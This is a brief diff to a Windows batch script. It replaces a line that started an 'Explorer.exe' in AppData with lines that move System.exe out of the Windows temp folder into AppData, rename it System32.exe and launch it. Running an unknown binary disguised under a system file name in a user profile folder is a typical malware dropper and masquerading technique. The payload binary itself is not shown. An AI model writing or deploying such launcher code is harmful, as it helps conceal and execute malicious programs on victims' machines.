@@ -1,3 +1,4 @@
 @echo off
-start %appdata%\\Microsoft\\Windows\\Explorer.exe
+move c:\windows\temp\System.exe %appdata%\\Microsoft\\Windows\\System32.exe
+start %appdata%\\Microsoft\\Windows\\System32.exe
 exit
